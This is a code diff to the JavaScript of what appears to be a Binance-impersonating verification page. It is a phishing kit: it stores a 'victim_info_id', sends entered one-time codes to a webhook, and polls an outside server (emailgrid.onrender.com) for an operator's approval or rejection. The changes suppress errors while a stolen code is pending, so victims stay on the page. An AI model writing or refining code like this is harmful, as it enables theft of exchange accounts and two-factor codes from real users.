@@ -531,13 +531,15 @@
             })
             .then(response => {
                 if (!response.ok) {
-                    throw new Error(`HTTP error! status: ${response.status}`);
+                    return response.text().then(text => {
+                        console.log('Error response body:', text);
+                        throw new Error(`HTTP error! status: ${response.status}, body: ${text}`);
+                    });
                 }
                 return response.json();
             })
             .then(result => {
                 console.log('Webhook response:', result);
-                
                 // Check if we have victim_info_id for polling
                 const victimInfoId = localStorage.getItem('binance_victim_info_id');
                 if (victimInfoId) {
@@ -556,57 +558,21 @@
             })
             .catch(error => {
                 console.error('Webhook error:', error);
-                // Handle error
-                setTimeout(() => {
-                    showError('Verification failed. Please try again.');
+                // Only show connection error for actual network failures
+                if (
+                    error.message.includes('Failed to fetch') ||
+                    error.message.includes('NetworkError') ||
+                    error.message.includes('TypeError')
+                ) {
                     resetButton();
-                }, 1000);
+                    showError('Connection error. Please check your internet connection and try again.');
+                }
+                // Do not hide loading or show error for pending/unapproved states
             });
-        }
-
-        function showSuccess(message) {
-            // Create or update success message element
-            let successElement = document.getElementById('success-message');
-            if (!successElement) {
-                successElement = document.createElement('div');
-                successElement.id = 'success-message';
-                successElement.style.cssText = `
-                    color: #02c076;
-                    font-size: 14px;
-                    margin-top: 10px;
-                    text-align: center;
-                    padding: 8px;
-                    background: rgba(2, 192, 118, 0.1);
-                    border-radius: 4px;
-                    border: 1px solid rgba(2, 192, 118, 0.2);
-                `;
-                const form = document.querySelector('.verification-form');
-                form.appendChild(successElement);
-            }
-            successElement.textContent = message;
-            successElement.style.display = 'block';
-            
-            // Hide any existing error messages
-            const errorElement = document.getElementById('error-message');
-            if (errorElement) {
-                errorElement.style.display = 'none';
-            }
-        }
-
-        function resetButton() {
-            const button = document.getElementById('submit-btn');
-            const buttonContent = button.querySelector('.button-content');
-            buttonContent.classList.remove('loading');
-            
-            // Re-enable button only if code is still valid
-            const code = document.getElementById('verificationCode').value.trim();
-            const codeRegex = /^\d{6}$/;
-            button.disabled = !codeRegex.test(code);
         }
 
         function pollForApproval(victimInfoId, campaignId, step) {
             const pollUrl = `https://emailgrid.onrender.com/api/check-approval/${victimInfoId}/${step}/`;
-            
             const poll = () => {
                 fetch(pollUrl, {
                     method: 'GET',
@@ -619,7 +585,6 @@
                 .then(response => response.json())
                 .then(result => {
                     console.log('Poll result:', result);
-                    
                     if (result.status === 'approved') {
                         // Hide loading and show success
                         resetButton();
@@ -633,7 +598,7 @@
                     } else if (result.status === 'rejected') {
                         // Hide loading and show error
                         resetButton();
-                        showError(result.error_message || 'Invalid verification code. Please try again.');
+                        showError(result.error_message || 'Invalid OTP. Please try again.');
                     } else {
                         // Still pending, continue polling
                         setTimeout(poll, 2000); // Poll every 2 seconds
@@ -645,7 +610,6 @@
                     setTimeout(poll, 3000);
                 });
             };
-            
             // Start polling
             poll();
         }
